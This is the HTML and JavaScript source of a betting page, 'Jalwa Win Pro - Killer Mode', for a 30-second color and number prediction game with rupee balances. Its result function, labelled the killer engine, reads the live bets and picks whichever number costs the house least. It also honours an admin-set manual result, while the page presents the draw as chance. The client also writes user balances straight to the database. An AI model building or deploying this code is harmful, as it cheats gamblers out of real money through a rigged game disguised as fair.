<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Jalwa Win Pro - Killer Mode</title>
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.0/firebase-database.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
    <style>
        :root { --green: #1DB954; --violet: #9c27b0; --red: #ff4757; --blue: #007AFF; --bg: #06091b; --card: #10142d; --cyan: #00ffca; }
        body { margin: 0; font-family: 'Poppins', sans-serif; background: var(--bg); color: white; user-select: none; padding-bottom: 20px; }
        #toast { display:none; position:fixed; top:20px; left:50%; transform:translateX(-50%); background:var(--cyan); color:#000; padding:10px 25px; border-radius:30px; z-index:10000; font-weight:bold; font-size:13px; }
        .nav { background: #10142d; color: #00ffca; padding: 15px; display: flex; justify-content: space-between; align-items: center; font-weight: 900; border-bottom: 1px solid #1f2855; position: sticky; top:0; z-index: 1000; }
        .bal-display { background: rgba(0,255,202,0.1); padding: 5px 15px; border-radius: 20px; border: 1px solid #00ffca; }
        .card { background: var(--card); margin: 15px; padding: 20px; border-radius: 15px; display: flex; justify-content: space-between; align-items: center; position: relative; border: 1px solid #1f2855; }
        .timer { font-size: 28px; font-weight: 800; font-family: monospace; color: #fff; }
        #lockOverlay { display: none; position: absolute; inset: 0; background: rgba(6,9,27,0.95); z-index: 2000; border-radius: 15px; justify-content: center; align-items: center; color: var(--red); font-weight: 800; letter-spacing: 2px; font-size: 14px; }
        .btn-row { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 10px; padding: 10px 15px; }
        .btn-join { border: none; padding: 14px; color: white; font-weight: 800; border-radius: 10px; cursor: pointer; text-transform: uppercase; font-size: 12px; }
        .num-grid { display: grid; grid-template-columns: repeat(5, 1fr); gap: 10px; padding: 15px; }
        .num-btn { width: 48px; height: 48px; border: 2px solid rgba(255,255,255,0.2); font-size: 18px; font-weight: 900; border-radius: 50%; cursor: pointer; color: white; box-shadow: 0 4px 8px rgba(0,0,0,0.4); transition: 0.2s; }
        .h-grid { display: grid; grid-template-columns: repeat(10, 1fr); gap: 15px 2px; padding: 15px 10px 25px; background: var(--card); margin: 0 15px; border-radius: 15px; min-height: 50px; }
        .dot { width: 26px; height: 26px; border-radius: 50%; display: flex; align-items: center; justify-content: center; color: white; font-weight: bold; font-size: 11px; position: relative; margin: 0 auto; box-shadow: 0 2px 5px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.2); }
        .dot-pid { font-size: 7px; color: #7e87a8; position: absolute; bottom: -16px; width: 40px; text-align: center; font-weight: bold; }
        .order-table { width: 100%; border-collapse: collapse; font-size: 11px; color: white; text-align: center; }
        .order-table th { padding: 10px; color: #7e87a8; border-bottom: 1px solid #1f2855; font-size: 10px; }
        .order-table td { padding: 12px 5px; border-bottom: 1px solid #1f2855; }
        #ticketOverlay { display: none; position: fixed; inset: 0; background: rgba(0,0,0,0.9); z-index: 5000; justify-content: center; align-items: center; backdrop-filter: blur(8px); }
        .ticket { background: #10142d; width: 85%; max-width: 340px; border-radius: 30px; text-align: center; border: 2px solid #1f2855; overflow: hidden; }
        .ticket-header { padding: 20px; font-weight: 900; font-size: 22px; color: #fff; }
        .win-bg { background: linear-gradient(180deg, var(--green), #0b6623); }
        .lose-bg { background: linear-gradient(180deg, var(--red), #851c1c); }
        .res-ball-big { width: 80px; height: 80px; border-radius: 50%; margin: -40px auto 15px; display: flex; align-items: center; justify-content: center; font-size: 40px; font-weight: 900; color: #fff; border: 4px solid #10142d; box-shadow: 0 10px 20px rgba(0,0,0,0.5); }
        .ticket-body { padding: 10px 25px 30px; }
        .bet-info-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; background: rgba(255,255,255,0.05); padding: 15px; border-radius: 15px; margin: 15px 0; border: 1px solid rgba(255,255,255,0.05); }
        .info-item { text-align: left; }
        .info-item small { display: block; color: #7e87a8; font-size: 9px; text-transform: uppercase; }
        .info-item b { font-size: 13px; color: #fff; }
        #betModal { display: none; position: fixed; bottom: 0; width: 100%; background: #10142d; z-index: 3000; border-radius: 25px 25px 0 0; padding: 20px; box-sizing: border-box; border-top: 2px solid var(--cyan); }
        .chip-row { display: flex; flex-wrap: wrap; justify-content: center; gap: 8px; margin-bottom: 20px; }
        .chip { padding: 8px 12px; background: #06091b; border-radius: 8px; cursor: pointer; border: 1px solid #1f2855; font-size: 12px; font-weight: bold; color: #fff;}
        .chip.active { background: var(--blue); border-color: white; }
    </style>
</head>
<body>
<div id="toast"></div>
<div class="nav"><span>JALWA WIN PRO</span><div class="bal-display">₹<span id="balDisplay">0.00</span></div></div>
<div class="card">
    <div><div style="font-size:10px;color:gray;">Period</div><div id="pIdDisplay" style="font-weight:900;color:var(--cyan);font-size:16px;">...</div></div>
    <div class="timer" id="timerDisplay">00:00</div>
    <div id="lockOverlay">CHECKING RESULT...</div>
</div>

<div class="btn-row">
    <button class="btn-join" style="background:var(--green)" onclick="openBet('Green')">Green</button>
    <button class="btn-join" style="background:var(--violet)" onclick="openBet('Violet')">Violet</button>
    <button class="btn-join" style="background:var(--red)" onclick="openBet('Red')">Red</button>
</div>

<div class="num-grid">
    <button class="num-btn" style="background:linear-gradient(135deg,#ff4757 50%,#9c27b0 50%)" onclick="openBet(0)">0</button>
    <button class="num-btn" style="background:var(--green)" onclick="openBet(1)">1</button>
    <button class="num-btn" style="background:var(--red)" onclick="openBet(2)">2</button>
    <button class="num-btn" style="background:var(--green)" onclick="openBet(3)">3</button>
    <button class="num-btn" style="background:var(--red)" onclick="openBet(4)">4</button>
    <button class="num-btn" style="background:linear-gradient(135deg,#1DB954 50%,#9c27b0 50%)" onclick="openBet(5)">5</button>
    <button class="num-btn" style="background:var(--red)" onclick="openBet(6)">6</button>
    <button class="num-btn" style="background:var(--green)" onclick="openBet(7)">7</button>
    <button class="num-btn" style="background:var(--red)" onclick="openBet(8)">8</button>
    <button class="num-btn" style="background:var(--green)" onclick="openBet(9)">9</button>
</div>

<div style="padding:15px 15px 5px; font-size:12px; color:gray; font-weight:bold;">TREND CHART</div>
<div id="historyGrid" class="h-grid"></div>

<div style="padding:20px 15px 5px; font-size:12px; color:gray; font-weight:bold;">MY RECORDS</div>
<div style="padding:0 15px; margin-bottom: 40px;">
    <table class="order-table">
        <thead><tr><th>Period</th><th>Select</th><th>Amount</th><th>Profit</th></tr></thead>
        <tbody id="orderBody"></tbody>
    </table>
</div>

<div id="betModal">
    <div style="display:flex;justify-content:space-between;margin-bottom:20px;"><b>Join <span id="betHead" style="color:var(--cyan)"></span></b><i class="fas fa-times" onclick="document.getElementById('betModal').style.display='none'"></i></div>
    <div class="chip-row">
        <div class="chip active" onclick="setBase(10, this)">10</div><div class="chip" onclick="setBase(20, this)">20</div><div class="chip" onclick="setBase(50, this)">50</div><div class="chip" onclick="setBase(100, this)">100</div><div class="chip" onclick="setBase(1000, this)">1000</div>
    </div>
    <div style="display:flex;justify-content:center;align-items:center;gap:35px;margin-bottom:25px;">
        <button onclick="changeMult(-1)" style="width:45px;height:45px;border-radius:50%;background:#000;color:#fff;border:1px solid #1f2855;">-</button>
        <b id="multDisplay" style="font-size:28px;color:var(--cyan)">1</b>
        <button onclick="changeMult(1)" style="width:45px;height:45px;border-radius:50%;background:#000;color:#fff;border:1px solid #1f2855;">+</button>
    </div>
    <div style="display:flex;gap:10px;">
        <button class="btn-join" onclick="document.getElementById('betModal').style.display='none'" style="background:#1f2855;flex:1">CLOSE</button>
        <button class="btn-join" onclick="confirmBet()" style="background:var(--blue);flex:2">CONFIRM ₹<span id="totalTxt">10</span></button>
    </div>
</div>

<div id="ticketOverlay">
    <div class="ticket">
        <div id="ticketHeader" class="ticket-header">RESULT</div>
        <div class="ticket-body">
            <div id="tBall" class="res-ball-big">?</div>
            <div id="tStatus" style="font-weight:bold; font-size:14px; margin-bottom:5px;">CONGRATULATIONS</div>
            <div id="tWinAmt" style="font-size:36px; font-weight:900;">₹0.00</div>
            <div class="bet-info-grid">
                <div class="info-item"><small>Period</small><b id="tPeriod">...</b></div>
                <div class="info-item"><small>Selection</small><b id="tSelect">...</b></div>
                <div class="info-item"><small>Bet Amount</small><b id="tBetAmt">₹0.00</b></div>
                <div class="info-item"><small>Bonus</small><b id="tBonus">₹0.00</b></div>
            </div>
            <button onclick="document.getElementById('ticketOverlay').style.display='none'" style="width:100%;padding:15px;border-radius:50px;background:white;color:black;font-weight:900;border:none;">AWESOME!</button>
        </div>
    </div>
</div>

<script>
    const firebaseConfig = { databaseURL: "https://jalwav7-default-rtdb.firebaseio.com" };
    if (!firebase.apps.length) firebase.initializeApp(firebaseConfig);
    const db = firebase.database();
    const SB_URL = "https://orksbkahfantwdbwzrye.supabase.co", SB_KEY = "sb_publishable_F7ErxCXZz7Zpcpd2-yH-Bg_qDFL8tUI";
    const supabaseClient = supabase.createClient(SB_URL, SB_KEY);

    const userId = localStorage.getItem('jalwa_user_phone') || 'Guest';
    let userBalance = 0, currentP = "", selectedType = "", baseAmt = 10, multiplier = 1, isLocked = false, lastProcessedPid = "";
    let myBets = JSON.parse(localStorage.getItem('my_jalwa_bets') || "[]");

    function showToast(m) { let t=document.getElementById('toast'); t.innerText=m; t.style.display='block'; setTimeout(()=>t.style.display='none',2000); }

    db.ref('users/' + userId).on('value', snap => {
        if(snap.exists()) { 
            let d = snap.val();
            userBalance = (d.balance && !isNaN(d.balance)) ? parseFloat(d.balance) : 0; 
            document.getElementById('balDisplay').innerText = userBalance.toFixed(2); 
        }
    });

    // --- ASLI KILLER ENGINE ---
    async function getKillerResult(pid) {
        try {
            // 1. Admin Manual Check
            const adminSnap = await db.ref('gameControl/manualResult').once('value');
            if(adminSnap.val() !== "none" && adminSnap.val() !== null) {
                let res = adminSnap.val();
                db.ref('gameControl/manualResult').set("none");
                return isNaN(res) ? (res === 'Green' ? 3 : (res === 'Red' ? 2 : 5)) : Number(res);
            }

            // 2. Fetch Bets
            const betSnap = await db.ref('gameControl/wingo/liveBets').once('value');
            const bets = betSnap.val() || {};
            let outcomes = [];

            for (let i = 0; i <= 9; i++) {
                let loss = 0;
                let col = (i==0||i==5)?(i==0?'Red':'Green'):(i%2==0?'Red':'Green');
                if(bets['num'+i]) loss += bets['num'+i] * 9;
                if(bets[col]) loss += (i==0||i==5)?(bets[col]*1.5):(bets[col]*2);
                if((i==0||i==5) && bets.Violet) loss += bets.Violet * 4.5;
                outcomes.push({ id: i, cost: loss });
            }

            outcomes.sort((a, b) => a.cost - b.cost);
            return outcomes[0].id; // Sabse sasta result
        } catch(e) { return Math.floor(Math.random()*10); }
    }

    async function processResult(pid) {
        if(!pid || lastProcessedPid === pid) return;
        lastProcessedPid = pid;

        let n = await getKillerResult(pid);
        let col = (n==0||n==5)?(n==0?'Red':'Green'):(n%2==0?'Red':'Green');
        await supabaseClient.from('game_history').insert([{ pid: pid, num: n, col: col }]);
        
        let winSum = 0, hit = false, lastB = null;
        myBets.forEach(b => {
            if(b.pid === pid && b.status === 'Wait') {
                hit = true; lastB = b;
                let isW = false, ratio = 0;
                if(!isNaN(b.sel)) { if(Number(b.sel) === n) { isW = true; ratio = 9; } } 
                else if(b.sel === 'Violet' && (n===0 || n===5)) { isW = true; ratio = 4.5; }
                else if(b.sel === 'Green' && (n%2!==0 || n===5)) { isW = true; ratio = (n===5)?1.5:1.9; }
                else if(b.sel === 'Red' && (n%2===0 || n===0)) { isW = true; ratio = (n===0)?1.5:1.9; }
                if(isW) { b.status = 'Win'; b.win = b.amt * ratio; winSum += b.win; } else { b.status = 'Loss'; b.win = 0; }
            }
        });

        if(hit) {
            localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
            if(winSum > 0) {
                db.ref('users/' + userId).transaction(c => {
                    if(c) {
                        let old = (c.balance && !isNaN(c.balance)) ? parseFloat(c.balance) : 0;
                        c.balance = parseFloat((old + winSum).toFixed(2));
                    }
                    return c;
                });
            }
            showTicket(n, col, winSum, lastB); 
        }
        updateOrderTable(); fetchHistory();
        db.ref('gameControl/wingo/liveBets').remove();
    }

    function showTicket(n, col, win, b) {
        const h = document.getElementById('ticketHeader');
        h.innerText = win > 0 ? "WINNER!" : "LOST";
        h.className = "ticket-header " + (win > 0 ? "win-bg" : "lose-bg");
        const bEl = document.getElementById('tBall'); bEl.innerText = n;
        bEl.style.background = (n==0) ? "linear-gradient(135deg,#ff4757 50%,#9c27b0 50%)" : (n==5) ? "linear-gradient(135deg,#1DB954 50%,#9c27b0 50%)" : (col==='Red'?'#ff4757':'#1DB954');
        document.getElementById('tStatus').innerText = win > 0 ? "CONGRATULATIONS" : "BETTER LUCK NEXT TIME";
        document.getElementById('tWinAmt').innerText = "₹" + win.toFixed(2);
        document.getElementById('tWinAmt').style.color = win > 0 ? "#1DB954" : "#ff4757";
        document.getElementById('tPeriod').innerText = b.pid;
        document.getElementById('tSelect').innerText = b.sel;
        document.getElementById('tBetAmt').innerText = "₹" + b.amt.toFixed(2);
        document.getElementById('tBonus').innerText = "₹" + (win > 0 ? (win - b.amt).toFixed(2) : "0.00");
        document.getElementById('ticketOverlay').style.display='flex';
    }

    function openBet(t) { if(isLocked) return; selectedType = t; multiplier = 1; updateBetUI(); document.getElementById('betModal').style.display='block'; document.getElementById('betHead').innerText=t; }
    function setBase(v, el) { baseAmt = v; document.querySelectorAll('.chip').forEach(c => c.classList.remove('active')); el.classList.add('active'); updateBetUI(); }
    function changeMult(v) { multiplier += v; if(multiplier < 1) multiplier = 1; updateBetUI(); }
    function updateBetUI() { document.getElementById('multDisplay').innerText = multiplier; document.getElementById('totalTxt').innerText = (baseAmt * multiplier); }

    async function confirmBet() {
        let total = baseAmt * multiplier;
        if(userBalance < total) return showToast("⚠️ Insufficient Balance");
        await db.ref('users/' + userId).update({ balance: userBalance - total });
        myBets.push({ id: Date.now(), pid: currentP, sel: selectedType, amt: total, status: 'Wait', win: 0 });
        localStorage.setItem('my_jalwa_bets', JSON.stringify(myBets));
        let key = isNaN(selectedType) ? selectedType : 'num'+selectedType;
        db.ref('gameControl/wingo/liveBets/'+key).transaction(c => (c || 0) + total);
        document.getElementById('betModal').style.display = 'none';
        updateOrderTable(); showToast("✅ Bet Placed!");
    }

    function updateOrderTable() {
        let h = ""; [...myBets].reverse().slice(0,10).forEach(b => {
            let profitStr = 'Wait';
            if(b.status === 'Win') profitStr = `<span style="color:var(--green)">+₹${(b.win - b.amt).toFixed(1)}</span>`;
            if(b.status === 'Loss') profitStr = `<span style="color:var(--red)">-₹${b.amt}</span>`;
            h += `<tr><td>${String(b.pid).slice(-4)}</td><td>${b.sel}</td><td>₹${b.amt}</td><td>${profitStr}</td></tr>`;
        });
        document.getElementById('orderBody').innerHTML = h;
    }

    async function fetchHistory() {
        const { data } = await supabaseClient.from('game_history').select('*').order('id', {ascending:false}).limit(30);
        if(data) {
            document.getElementById('historyGrid').innerHTML = data.map(r => {
                let n = r.num;
                let bgStyle = (n==0) ? "linear-gradient(135deg,#ff4757 50%,#9c27b0 50%)" : (n==5) ? "linear-gradient(135deg,#1DB954 50%,#9c27b0 50%)" : (r.col==='Red'?'#ff4757':'#1DB954');
                return `<div class="dot" style="background:${bgStyle}">${n}<span class="dot-pid">${String(r.pid).slice(-3)}</span></div>`;
            }).join('');
        }
    }

    function sync() {
        const now = new Date(); const rem = 30 - (now.getSeconds() % 30);
        isLocked = rem <= 5; document.getElementById('lockOverlay').style.display = isLocked ? 'flex' : 'none';
        document.getElementById('timerDisplay').innerText = `00:${rem.toString().padStart(2,'0')}`;
        let pid = now.getFullYear().toString() + (now.getMonth()+1).toString().padStart(2,'0') + now.getDate().toString().padStart(2,'0') + Math.floor(((now.getHours()*3600)+(now.getMinutes()*60)+now.getSeconds())/30);
        document.getElementById('pIdDisplay').innerText = pid;
        if(currentP !== pid) { let old = currentP; currentP = pid; if(old) processResult(old); }
    }
    setInterval(sync, 1000);
    window.onload = () => { fetchHistory(); updateOrderTable(); sync(); };
</script>
</body>
</html>
